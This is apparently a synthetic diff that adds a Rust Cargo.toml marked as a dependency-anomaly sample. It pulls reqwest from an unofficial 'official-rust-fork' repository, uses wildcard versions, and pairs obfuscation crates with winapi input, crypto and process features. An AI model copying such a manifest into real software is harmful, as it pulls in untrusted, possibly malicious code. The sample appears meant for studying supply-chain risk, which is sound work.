@@ -1,0 +1,11 @@
+[package]
+name = "syn_depanomaly_214"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+winapi = { version = "*", features = ["winuser", "wincrypt", "processthreadsapi"] }
+reqwest = { git = "https://github.com/official-rust-fork/reqwest" }
+obfstr = "*"
+xor-crypt = "*"
+
